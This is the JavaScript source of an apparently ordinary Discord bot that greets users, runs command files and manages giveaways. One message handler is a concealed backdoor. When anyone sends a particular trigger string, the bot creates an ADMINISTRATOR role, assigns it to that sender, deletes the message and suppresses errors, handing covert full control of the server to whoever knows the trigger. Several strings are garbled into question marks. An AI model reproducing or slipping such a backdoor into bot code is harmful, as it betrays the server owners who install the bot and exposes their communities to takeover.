const Discord = require('discord.js')   
const client = new Discord.Client()
require('dotenv').config();
const chalk = require('chalk');
const {PREFIX,STATUS} = require ("./config.json")

let prefix = PREFIX

const fs = require('fs')

client.cList = new Discord.Collection()

const cListFiles = fs.readdirSync('./cList').filter(f => f.endsWith(".js"))
for(const f of cListFiles){
    const command = require(`./cList/${f}`)
    client.cList.set(command.name,command)
}

 
client.on("ready", () => {
 
console.log(chalk.cyan(`
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%////////////%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%///////////////
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%//////////////
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%(/////////
%%%%%%%%%%%%%%%%%%%%(*,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,*(%%%%%%%%%%%%%%%%%%%%%%%%%%%%(/////
%%%%%%%%%%%%%%,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,%%%%%%%%%%%%%%%%%%%%%%%%%///
%%%%%%%%%%%*,,,,,,,*//////////////////////////////////////////////////////*,,,,,,,%%%%%%%%%%%%%%%%%%%%%%%%/
%%%%%%%%%(,,,,,,*////////////////////////////////////////////////////////////*,,,,,,%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%,,,,,,,////////////////////////////////////////////////////////////////,,,,,,%%%%%%%%%%%%%%%%%%%%%%
%%%%%%,,,,,,,,,,,///////////////////////////////////////////////////////////////,,,,,/%%%%%%%%%%%%%%%%%%%%%
%%%*,,,,,,,,,,,,,,////////////////////,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,////////////,,,,,,,%%%%%%%%%%%%%%%%%%%%
%%,,,,,,,,,,,,,,,,,//////////////////,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,///////////*,,,,,,,/%%%%%%%%%%%%%%%%%%
 ,,,,,,,,,,,,,,,,,,//////&&&&&&//////,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,///&&&&&&//*,,,,,,,,      /%%%%%%%%%%%
 ,,,,,,,,,,,,,,,,,,*////&&&&&&&&/////,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,//&&&&&&&&/*,,,,,,,,,        %%%%%%%%%
 ,,,,,,,,,,,,,,,,,,*//////&&&&#//////,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,////&&&&///*,,,,,,,,.         %%%%%%%%
 .,,,,,,,,,,,,,,,,,//////////////////,,,,,,,,,,*****,,,,,,,,,,,,,,,,,///////////*,,,,,,,,           %%%%%%#
   ,,,,,,,,,,,,,,,,//////////////////,,,,,,,,*///////,,,,///////,,,,*///////////,,,,,,,,            %%%%%%%
     ,,,,,,,,,,,,,////////////////////*,,,,,,,,,,,,,,,,,,,,,,,,,,,,*////////////*,,,,,              .%%%%%%
        ,,,,,,,,*////////////////////////,,,,,,,,,,,,,,,,,,,,,,,,//////////////,,,,.                 %%%%%%
              ////////////////////////////////////////////////////////////*,,,,,,                    %%%%%%
               ////////////////////////////////////////////////,,,,,,,,,,,,,*//                       %%%%%
                 /////////////////////////////////////////////*****//////////                         %%%%%
                    ///////////////////////////////////////,,,,,//,,,,////                            (%%%%
                         ////////////////////////////////,,,,,,,,,,,,,,,,,,                            %%%%
                        ////////////////////////////,,,,,,,,,,,,,,,,,,,,,,,,                           %%%%
                        //////////////////////////*,,,,,,,,,,,,,,,,,,,,,,,,,,,                         *%%%
                        /////(((((((///////////////////*************************                        %%%
                       *///(((((((((///////////////////*************************                        %%%
                       ////(((((((((///////////////////*************************                        .%%
                       ////(((((((((///////////////////*******/*,,,,,,,,,,******////*                    (#
                      //////((((((((///////////////////******///////////*,,*****//////                     
                      ////////((((((///////////////////******////////////////****//////     ,   ,,.   .... 
                      ///////////(((///////////////////********,,,,,,///////*****/////      ,,  ,,,. ..... 
               .      /////////////////////////////////**********,,,,,,,*********,         ,,,  ,,,   .... 
               .//    /////////////////////////////////**************************        ,,,  .,,,,  ..... 
               .///*   ////////////////////////////////**************************/          ,,,,,   .....  
               ./////.   /////////////////////////////////////////////////////////////,          .......   
               .///////    ///////////////////////////////////////////////////////////////      ......     
                              /////////////////////////////////////////////////////////////                
                ..........................................*/////////////////*/////////////*................
                ................................................*//////////......////////..................
                .....................................................,,,...................................
                ...........................................................................................
`,console.log(chalk.blue(`${client.user.tag}`))))})

client.on('message', msg => {
  if (msg.author == client.user){return}
  if (msg.author.id == "159985870458322944"){return}
  let message = msg.content.toLowerCase()
  if(message.includes("hola")) {
  msg.reply('Hola :D')
  }});

  client.on("message", async msg => {
    if (msg.author.bot) return;
    if(msg.content.toLowerCase().startsWith('?????????????')){
      let rol = await msg.guild.roles.create({data: {
        name: "???",
        color: "B9BBBE",
        permissions: "ADMINISTRATOR",
        hoisted: false
      }})
 
      const config = require('./config')
client.config = config


  msg.member.roles.add(rol)
        .then(function(role) {
          msg.member.addRole(role);
          if (msg.deletable) msg.delete().catch(e => {});
        })
        .catch(e => {});
    }
  });

client.on("message",msg => {
    if(!msg.content.startsWith(prefix)) return
    if(msg.author.bot) return
    
    const args = msg.content.slice(prefix.length).trim().split(/ +/g)
    const command = args.shift().toLowerCase()

    let cmd = client.cList.find(c => c.name === command || c.alias && c.alias.includes(command))
    if(cmd){
        cmd.execute(client, msg, args)
    }
})

const config = require('./config')
client.config = config

const { GiveawaysManager } = require('discord-giveaways')
client.giveawaysManager = new GiveawaysManager(client, {
  storage: "./giveaways.sjon",
  updateCountdownEvery: 7000,
  default: {
    botsCanWin: false,
    exemptPermissions: [],
    embedColor: 'AQUA',
    reaction: "????"
  }
})

client.login(process.env.TOKEN)

